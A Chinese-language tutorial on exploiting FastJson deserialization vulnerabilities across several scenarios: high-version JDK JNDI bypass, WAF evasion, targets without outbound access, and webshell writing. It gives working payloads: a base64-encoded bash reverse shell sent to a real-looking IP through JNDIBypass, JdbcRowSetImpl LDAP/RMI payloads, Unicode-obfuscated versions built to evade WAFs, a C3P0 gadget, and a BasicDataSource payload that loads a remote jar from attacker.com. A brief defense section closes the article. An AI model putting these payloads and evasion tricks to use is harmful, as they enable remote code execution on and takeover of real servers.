引言

FastJson是阿里巴巴开源的高性能JSON处理库，广泛应用于Java Web应用、移动端接口和微服务中。然而，由于其强大的自动类型转换机制和反序列化特性，FastJson历史上爆发过多个严重漏洞（如CVE-2017-18349、CVE-2022-25845等），攻击者可利用这些漏洞实现远程代码执行（RCE）。随着JDK版本升级和安全防护的增强，高版本JDK、WAF防护、不出网环境等场景给漏洞利用带来了新的挑战。本文将从实战角度出发，结合多个典型场景，深入剖析FastJson漏洞的利用技巧与绕过方法，帮助安全研究人员和企业更好地理解和防御此类威胁。

一、FastJson漏洞核心原理

FastJson的反序列化漏洞主要源于其支持通过@type指定类名进行实例化，并自动调用目标类的setter或getter方法。攻击者通过构造恶意JSON数据，触发危险类的特定方法（如JNDI注入、文件写入等）实现代码执行。常见的利用链包括JdbcRowSetImpl（JNDI注入）、TemplatesImpl（加载字节码）、C3P0（二次序列化）等。

二、环境准备与版本探测

在进行漏洞利用前，我们需要准确识别目标使用的FastJson版本。Niiiiko开发的FastjsonScan4Burp插件可集成到Burp Suite中，通过解析响应特征（如字符串、异常信息）自动识别版本。安装后，访问目标应用时插件会在仪表盘或扩展输出中显示版本信息。

例如，对于FastJson 1.2.47版本，插件可能提示fastjson version: 1.2.47。版本信息直接决定了后续可利用的链和绕过策略。

三、JDK高版本下的JNDI注入绕过

3.1 背景

Java高版本（JDK 8u191+、11+）默认对JNDI注入进行了限制：禁止加载远程RMI/ LDAP服务器上的Java对象（com.sun.jndi.ldap.object.trustURLCodebase默认关闭）。传统的JNDI注入payload在此时会失效。

3.2 利用工具：JNDIBypass

B4aron1开发的JNDIBypass工具可以帮助绕过该限制。它通过启动一个恶意的LDAP服务器，返回一个能够加载本地ClassPath中类的Reference，从而绕过trustURLCodebase检查。

实战步骤：

1. 启动JNDIBypass服务器，指定反弹shell命令（Base64编码）：
   ```bash
   java -jar JNDIBypass.jar -a 0.0.0.0 -p 1389 -c "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMzIuMjIwLjE0Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}"
   ```
   命令含义：将反弹shell命令base64编码，避免特殊字符问题。
2. 构造FastJson payload，利用JdbcRowSetImpl触发JNDI查询：
   ```json
   {
       "a": {
           "@type": "java.lang.Class",
           "val": "com.sun.rowset.JdbcRowSetImpl"
       },
       "b": {
           "@type": "com.sun.rowset.JdbcRowSetImpl",
           "dataSourceName": "ldap://101.32.220.14:1389/AoKhk",
           "autoCommit": true
       }
   }
   ```
   其中@type用于指定类，dataSourceName指向恶意LDAP服务。
3. 在本地监听反弹shell：
   ```bash
   nc -lvvp 9999
   ```

当目标服务器（JDK 8u342）解析该JSON时，会发起LDAP查询，最终加载恶意类执行命令，成功获得反弹shell。

四、编码特性绕过WAF

4.1 WAF检测原理

许多WAF（Web应用防火墙）通过正则匹配JSON中的关键字符串（如@type、com.sun.rowset.JdbcRowSetImpl）来拦截攻击。然而FastJson在解析JSON时，默认支持对\u开头的Unicode编码和十六进制（如\x）进行解码。利用这一特性，我们可以将payload中的敏感关键字进行编码，绕过WAF的简单匹配。

4.2 编码绕过实战

以1.2.47版本的JNDI注入为例，原始payload为：

```json
{
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://101.32.220.14:1389/cEsHj",
        "autoCommit": "true"
    }
}
```

WAF可能检测到@type和JdbcRowSetImpl。将其全部转换为Unicode编码（可使用在线工具或脚本），例如@type → \u0040\u0074\u0079\u0070\u0065，com.sun.rowset.JdbcRowSetImpl → \u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c。

最终payload如下：

```json
{
    "a":{
        "\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073",
        "\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"
    },
    "b":{
        "\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c",
        "\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"\u0072\u006d\u0069\u003a\u002f\u002f\u0031\u0030\u0031\u002e\u0033\u0032\u002e\u0032\u0032\u0030\u002e\u0031\u0034\u003a\u0031\u0030\u0039\u0039\u002f\u007a\u0039\u0069\u0035\u0074\u0074",
        "\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074":"\u0074\u0072\u0075\u0065"
    }
}
```

发送此payload，WAF将无法匹配到明文字符串，而FastJson解析时自动解码，仍会触发JNDI注入。

五、不出网场景与C3P0利用

5.1 挑战

很多内网环境限制出网连接（如不能访问外网LDAP/RMI服务器），传统的JNDI注入无法使用。此时需要利用“本地利用链”，例如C3P0的http base或hex机制，将恶意类字节码通过数据源属性传递，无需出网。

5.2 C3P0链原理

C3P0是一个数据库连接池库，其com.mchange.v2.c3p0.WrapperConnectionPoolDataSource类在反序列化时，如果设置了userOverridesAsString属性，会将该字符串解析为Properties对象，并进一步触发com.mchange.v2.naming.JavaBeanObjectFactory实例化对象，从而实现代码执行。攻击者可将恶意类的字节码经Base64编码后放入userOverridesAsString中，并指定HexAsciiSerializedMap作为前缀，使C3P0将其反序列化为对象。

5.3 实战构造

假设目标环境不能出网，需要写入文件或执行本地命令。我们可以使用marshalsec等工具生成C3P0 payload，但更常见的是手动构造。关键点是userOverridesAsString的值需要是HexAsciiSerializedMap:开头，后跟序列化对象的十六进制字符串。

由于WAF可能拦截userOverridesAsString关键字，可以利用y4tacker师傅提出的技巧：在关键字中间插入下划线（_）或加号（+）绕过检测，FastJson在解析时会忽略这些字符。例如：

· userOverridesAsString → us_erOverridesAsString

示例payload：

```json
{
    "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
    "us_erOverridesAsString": "HexAsciiSerializedMap:ACED0005...（省略）",
    "otherProp": "value"
}
```

其中HexAsciiSerializedMap后的内容为序列化对象的十六进制表示。生成该序列化对象的方法：使用java.lang.Runtime执行命令的类，序列化后转Hex。

注意：otherProp可以是任意属性，用于维持JSON格式完整。

六、高版本写入链：写JSP Webshell

6.1 写入链背景

在无法执行系统命令或反弹shell的情况下，攻击者常通过写入文件（如JSP Webshell）获取持久化权限。FastJson的高版本（1.2.68+）中，官方加入了safeMode和安全检查，但仍有利用链如org.apache.tomcat.dbcp.dbcp2.BasicDataSource可实现文件写入。

6.2 探测中间件与路径

利用写入链前，需先探知目标使用的中间件（如Tomcat、Jetty）及其部署路径。可通过错误信息、响应头、或者尝试读取已知配置文件（如/WEB-INF/web.xml）来确定。例如使用java.io.File类列出目录：

```json
{
    "@type": "java.io.File",
    "path": "/usr/local/tomcat/webapps/ROOT/"
}
```

如果应用返回了文件列表或错误信息，可间接判断路径。

6.3 利用BasicDataSource写文件

org.apache.tomcat.dbcp.dbcp2.BasicDataSource有一个属性driverClassName，若设置为非JDBC驱动类，会在创建连接时尝试加载该类，并触发其静态代码块。同时，通过driverClassLoader可以指定一个自定义类加载器加载恶意类。但更直接的写文件方式是利用其connectionInitSqls属性，但需要配合其他类。

一个经典写JSP链是：org.apache.tomcat.dbcp.dbcp2.BasicDataSource + org.apache.tomcat.dbcp.dbcp2.Utils 或 org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory 的createDataSource方法，结合java.io.FileOutputStream写入文件。但构造较复杂，通常使用已知Gadget。

示例payload（写入webshell到web目录）：

```json
{
    "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
    "driverClassName": "javax.script.ScriptEngineManager",
    "driverClassLoader": {
        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource$ClassLoader",
        "urls": [
            {
                "@type": "java.net.URL",
                "val": "http://attacker.com/evil.jar"
            }
        ]
    }
}
```

此例通过远程加载jar包执行代码，但若不出网，可尝试直接写文件。有研究者提出利用org.apache.tomcat.util.http.fileupload.IOUtils配合FileOutputStream写文件，但需要环境存在相应类。

七、防御建议

1. 升级FastJson版本：官方在后续版本中增强了安全检查，建议升级到最新版，并开启safeMode。
2. 禁用@type：在不必要的情况下，关闭自动类型转换（Feature.SupportAutoType）。
3. WAF深度检测：除了关键词匹配，还应检测编码后的特征，如对Unicode解码后再匹配。
4. 最小化依赖：移除不常用的类库（如C3P0、Tomcat DBCP）以减少攻击面。
5. 网络隔离：限制服务器对外访问，阻止JNDI出网。
6. 行为监控：检测反序列化异常调用，如JdbcRowSetImpl的dataSourceName设置为外部LDAP。

八、总结

FastJson漏洞利用技术随着JDK和安全产品的升级不断演变，从简单的JNDI注入到复杂的高版本绕过、WAF编码绕过、不出网利用和文件写入，攻击手法日益多样。本文通过实战演示了四种典型场景，帮助读者理解漏洞原理和绕过技巧。安全人员应持续关注FastJson漏洞动态，结合纵深防御策略，确保应用安全。

---

参考资料：

· FastJsonParty - 全版本漏洞环境
· FastjsonScan4Burp - 版本探测插件
· JNDIBypass - 高版本JDK绕过工具
· y4tacker博客 - FastJson绕WAF
